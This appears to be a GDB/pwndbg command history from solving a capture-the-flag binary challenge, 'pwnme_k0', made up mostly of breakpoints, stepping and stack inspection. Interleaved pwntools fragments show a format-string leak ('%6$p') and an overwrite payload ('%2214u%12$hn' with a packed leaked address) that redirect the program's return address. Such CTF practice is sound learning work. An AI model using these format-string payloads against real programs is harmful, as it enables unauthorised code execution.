b *0x400B28
r
telescope 25
b *0x0400B28
r
t 30
telescope 30
stack 30
bt
n
n
n
n
n
n
n
bt
find system
b *0x400B28
r
telescope 25
n
n
n
n
n
n
n
stack 20
b *0x400B28
r
stack 1
stack 1
stack 100
b *0x400B28
r
telescope 20
stack 10
b *0x0400B40
c
bt
r
b *0x400b28
r
stack 100
b *0x400b28
r
stack 100
# context.log_level = 'debug'
elf=ELF('./pwnme_k0')
p=process('./pwnme_k0')
# gdb.attach(p,'break *0x400B39')
p.recvuntil('Input your username(max lenth:20):')
p.sendline('a'*8)
p.recvuntil('Input your password(max lenth:20):')
p.sendline('%6$p')
p.recvuntil('>')
p.sendline('1')
data=p.recvuntil('>')
data=data.split('\n')[1]
leak_addr=int(data,16)-0x38
# print hex(leak_addr)
p.sendline('2')
p.recvuntil('please input new username(max lenth:20):')
p.sendline('b'*8)
p.recvuntil('please input new password(max lenth:20):')
payload = "%2214u%12$hn"
payload += p64(leak_addr)
p.send(payload)
p.recvuntil('>')
p.sendline('1')
n
context.log_level = 'debug'
elf=ELF('./pwnme_k0')
p=process('./pwnme_k0')
gdb.attach(p,'break *0x400B39') #一开始就把gdb attach上去，然后设置好断点位置，break *0x400B39就是设置断点，然后c一下就执行到断点位置了。
p.recvuntil('Input your username(max lenth:20):')
p.sendline('a'*8)
p.recvuntil('Input your password(max lenth:20):')
p.sendline('%p'*8)
p.recvuntil('>')
p.sendline('1')
p.recvuntil('>')
b *0x400B28
r
s
b *0x400B28
r
n
b *0x400B28
r
b *0x400b39
c
s
c
r
r
b *0x400B28
r
s
n
c
r
b *0x400b39
c
s
n
so
stack 30
n
n
n
n
n
n
n
n
stack 100
n
p rsp
p $rsp
q
b *0x400B28
r
p $rbp
p $rsp
b *0x400b34
c
p $rbp
p $rsp
n
s
so
r
s
p $rsp
p $rbp
x/10gx 0x7fffffffdda0
x/10gx 0x7fffffffde50
c
n
p $rbp
p $rsp
s
p $rbp
p $rsp
g
n
p $rbp
p $rsp
n
n
p $rsp
p $rbp
n
n
n
b *ox400B28
b *0x400B28
r
stack 10
b *0x400b39
c
s
q
c
c
c
start
p $rbp
b main
b *0x400DD8
r
n
n
r
n
n
n
n
b *0x400D2B
b *0x400B07
r
c
c
x/gx 0x7fffffffde50
n
x/gx 0x7fffffffdda0
x/gx 0x7fffffffde50
n
n
n
n
s
0x7fffffffdda0-0x7fffffffdd68
p 0x7fffffffdda0-0x7fffffffdd68
b *0x400b28
c
s
p 0x7fffffffdda0-0x7fffffffdd68
p hex(0x7fffffffdda0-0x7fffffffdd68)
p int(0x7fffffffdda0-0x7fffffffdd68,16)
b *0x400B28
r
s
b *0x400B39
r
s
stack 10
ls
ls
b *0x0000000000400B28
r
s
b *0x0000000000400B39
r
s
b *0x0000000000400B28
b *0x0000000000400B39
r
s
c
n
r
c
s
n
n
